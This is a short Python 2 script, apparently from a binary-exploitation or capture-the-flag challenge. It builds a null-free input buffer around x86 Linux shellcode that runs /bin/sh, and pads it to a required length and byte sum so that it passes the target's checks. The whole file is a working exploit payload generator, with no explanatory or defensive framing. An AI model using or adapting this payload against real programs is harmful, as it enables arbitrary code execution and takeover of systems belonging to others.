last_byte = '\x97' # xchg eax, edi
req_len = 0x3d
req_sum = 0x1ee7-557 #The 557 accounts for data after the buffer

shellcode = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80'
assert(len(shellcode) < req_len - 2)
def strsum(string):
    sum = 0
    for i in string:
        sum += ord(i)
    return sum
buf = "X" + shellcode
current_length = len(buf + last_byte)
current_sum = strsum(buf + last_byte)
left_len = req_len - current_length
left_sum = req_sum - current_sum
for i in range(left_len - 1):
    buf += chr(left_sum/left_len)
buf += chr(req_sum - strsum(buf + last_byte)) + last_byte
assert(len(buf) == req_len)
assert(strsum(buf) == req_sum)
assert('\0' not in buf)
print buf